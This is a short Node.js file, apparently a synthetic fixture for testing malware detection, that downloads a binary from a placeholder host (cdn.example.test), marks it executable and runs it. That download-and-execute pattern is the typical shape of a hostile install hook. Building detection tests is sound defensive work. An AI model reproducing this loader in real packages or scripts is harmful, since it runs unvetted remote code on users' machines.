// FIXTURE ONLY - synthetic detection test sample, not real malware
const https = require('https');
const fs = require('fs');
const { execFileSync } = require('child_process');
const dest = __dirname + '/acme-bin';
https.get('https://cdn.example.test/acme-linux-x64', (res) => {
  const out = fs.createWriteStream(dest);
  res.pipe(out);
  out.on('finish', () => { fs.chmodSync(dest, 0o755); execFileSync(dest, []); });
});
